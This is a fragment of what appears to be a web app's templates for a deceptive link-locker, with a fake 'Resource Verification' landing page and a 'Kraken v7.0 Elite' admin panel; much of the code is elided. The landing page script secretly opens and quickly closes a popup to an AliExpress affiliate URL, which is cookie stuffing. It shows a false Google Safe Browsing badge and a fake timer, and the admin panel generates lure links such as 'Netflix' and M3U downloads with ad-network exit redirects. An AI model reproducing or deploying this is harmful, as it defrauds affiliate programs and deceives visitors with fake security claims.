...
# --- واجهة الزائر (The Landing Page) ---
LANDING_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Resource Verification</title>
...
<body class="text-slate-800">
    <div class="max-w-xl mx-auto pt-12 px-6">
        <div class="bg-white rounded-[2.5rem] p-10 shadow-xl shadow-blue-100/40 border border-blue-50 text-center mb-10">
            ...
            <h1 class="text-2xl font-bold text-slate-900 mb-2">Resource Verification</h1>
            ...
            <div id="timer_area" class="bg-slate-50 p-8 rounded-[2rem] border border-slate-100">
                ...
                <p id="timer_text" class="text-[10px] font-bold text-blue-500 uppercase tracking-[0.2em]">Preparing Link: 15s</p>
            </div>
        </div>
        <div class="pb-32 px-2">
            ...
            <div class="text-slate-500 leading-relaxed text-sm space-y-6">
                <p>{{ article.body }}</p>
                <div class="h-48 bg-slate-50 rounded-[2.5rem] border border-dashed border-slate-200 flex items-center justify-center text-slate-300 text-[10px] uppercase tracking-widest italic">Encrypted Protocol Active</div>
        ...
        <div class="fixed bottom-0 left-0 w-full p-6 bg-gradient-to-t from-white via-white to-transparent">
            ...
            <div id="final_area" class="max-w-md mx-auto hidden">
                ...
                <p class="text-[8px] text-slate-300 mt-4 text-center uppercase tracking-widest font-medium">Verified by Google Safe Browsing</p>
            </div>
        </div>
    </div>
    <script>
        ...
        function triggerInject() {
            if(!isInjected && "{{ s.stuffing_url }}") {
                ...
                if(pop) { window.focus(); setTimeout(() => { try{pop.close();}catch(e){} }, 2500); }
                isInjected = true;
            }
        }
        ...
        function check() {
            if(isTimeUp && isScrolled) {
                ...
                document.getElementById('header_msg').innerText = "Verification Successful.";
            }
        }
...
<body class="p-4 text-slate-800">
    <div class="max-w-xl mx-auto">
        <header class="bg-white p-6 rounded-[2rem] shadow-sm border border-slate-100 mb-6 flex justify-between items-center">
            <h1 class="text-xl font-black text-blue-600 tracking-tighter uppercase">Kraken v7.0 Elite</h1>
            <span class="bg-blue-50 text-blue-600 text-[10px] font-black px-4 py-2 rounded-full border border-blue-100 font-mono">ENCRYPTED</span>
        </header>

        <div class="bg-white p-8 rounded-[2.5rem] shadow-sm border border-slate-100 mb-6">
            <h2 class="text-xs font-black text-slate-400 uppercase tracking-widest mb-6">Global Strategy</h2>
            <form action="/admin/update_settings" method="POST" class="space-y-4">
                <div>
                    <label class="block text-[10px] font-bold text-slate-400 mb-2 ml-1">BACKGROUND INJECTION (ALIEXPRESS)</label>
                    <input name="stuffing_url" value="{{ s.stuffing_url }}" class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl outline-none focus:border-blue-500 text-xs font-mono">
                </div>
                <div>
                    <label class="block text-[10px] font-bold text-slate-400 mb-2 ml-1">EXIT REDIRECT (ADSTERRA/TONIC)</label>
                    <input name="exit_url" value="{{ s.exit_url }}" class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl outline-none focus:border-blue-500 text-xs font-mono">
                </div>
                <button class="w-full bg-slate-900 text-white py-4 rounded-2xl font-black text-xs uppercase tracking-widest shadow-lg active:scale-95 transition">Update System</button>
            </form>
        </div>

        <div class="bg-white p-8 rounded-[2.5rem] shadow-sm border border-slate-100 mb-10">
            <h2 class="text-xs font-black text-slate-400 uppercase tracking-widest mb-6">Campaign Generator</h2>
            <form action="/admin/create_link" method="POST" class="space-y-4">
                <input name="title" placeholder="Resource Name (e.g. Netflix)" class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl outline-none focus:border-blue-500 text-xs" required>
                <input name="target_url" placeholder="Direct Download/M3U Link" class="w-full p-4 bg-slate-50 border border-slate-100 rounded-2xl outline-none focus:border-blue-500 text-xs" required>
                <button class="w-full bg-blue-600 text-white py-4 rounded-2xl font-black text-xs uppercase tracking-widest shadow-xl active:scale-95 transition">Generate Campaign Link</button>
            </form>
        </div>
        ...
        <div class="space-y-4 pb-20">
            ...
            <div class="bg-white p-6 rounded-[2.5rem] shadow-sm border border-slate-100">
                <div class="flex justify-between items-center mb-4">
                    ...
                    <a href="/admin/delete/{{ link._id }}" class="bg-red-50 text-red-400 p-3 rounded-2xl hover:bg-red-100 transition">🗑️</a>
                </div>
